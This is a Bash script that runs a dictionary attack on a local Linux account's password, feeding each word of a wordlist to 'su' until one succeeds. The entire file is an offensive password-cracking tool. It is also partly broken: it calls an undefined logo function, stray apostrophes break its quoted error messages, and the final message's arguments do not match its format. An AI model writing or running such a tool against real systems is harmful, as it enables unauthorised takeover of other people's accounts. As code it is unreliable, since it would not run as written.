#!/usr/bin/env bash

readonly C_RED=$'\e[1;31m'
readonly C_GREEN=$'\e[1;32m'
readonly C_YELLOW=$'\e[1;33m'
readonly C_BLUE=$'\e[1;34m'
readonly C_RESET=$'\e[0m'

readonly TIMEOUT="${TIMEOUT:-0.25}"

mostrar_ayuda() {
    printf '%sUso: %sUser Dicionary %s\n' "$C_YELLOW" "$0" "$C_RESET"
    printf '%sMust specify the user and dictionay to bruteforce.%s\n' "$C_RED" "$C_RESET"
    exit 1
}

finalizar() {
    printf '\n%sEnding bruteforcing...%s\n' "$C_RED" "$C_RESET"
    exit 130
}

trap finalizar INT TERM HUP

mostrar_logo

(( $# == 2 )) || mostrar_ayuda

usuario=$1
diccionario=$2

if [[ ! -f $diccionario || ! -r $diccionario ]]; then
    printf '%sError: can't read the dictionary: %s%s\n' "$C_RED" "$diccionario" "$C_RESET"
    exit 1
fi

if ! id -u -- "$usuario" &>/dev/null; then
    printf '%sError: User doesn't exist: %s%s\n' "$C_RED" "$usuario" "$C_RESET"
    exit 1
fi

if ! command -v timeout &>/dev/null; then
    printf '%sError: it requires a command "timeout".%s\n' "$C_RED" "$C_RESET"
    exit 1
fi

printf '%sAttacking user: %s%s\n\n' "$C_BLUE" "$usuario" "$C_RESET"

intentos=0

while IFS= read -r password || [[ -n $password ]]; do
    password=${password%$'\r'}
    [[ -z $password ]] && continue

    intentos=$((intentos + 1))
    printf 'Testing password: %s\n' "$password"

    if timeout -k 0.1 "$TIMEOUT" su -s /bin/sh -c 'exit 0' "$usuario" <<< "$password" &>/dev/null; then
        printf '%sPassword found %s: %s%s\n' "$C_GREEN" "$usuario" "$password" "$C_RESET"
        exit 0
    fi
done < "$diccionario"

printf '%s Password not found .%s\n' "$C_RED" "$usuario" "$intentos" "$C_RESET"
exit 1
